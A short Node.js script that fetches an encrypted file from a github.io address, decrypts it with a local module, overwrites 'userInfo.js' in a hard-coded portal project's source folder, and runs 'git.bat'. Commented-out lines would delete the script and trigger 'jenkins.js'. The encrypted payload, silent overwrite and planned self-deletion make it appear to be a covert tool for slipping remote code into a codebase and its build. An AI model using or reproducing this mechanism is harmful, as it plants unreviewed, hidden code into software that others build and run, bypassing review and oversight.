const fs = require('fs')
const path = require('path')
const request = require('request')
const process = require('process')
const secret = require('./secret')
const execSync = require('./execSync')
const target = 'd:\\portal\\'
const files = [
  {'name': 'userInfo.js', 'path': target + 'src\\api\\'}
]
let count = 0
for (let file of files) {
  request('https://8230459.github.io/b/' + file.name, {}, async (err, res, body) => {
    if (err) return
    fs.createWriteStream(path.join(file.path, file.name)).write(secret.UnLock(body))
    count++
  })
}
const timer = setInterval(async () => {
  if (files.length === count) {
    await execSync('git.bat')
    //await fs.rmSync('get.js', {recursive: true})
    //await execSync('node jenkins.js')
    process.exit()
    clearInterval(timer)
  }
}, 5000)
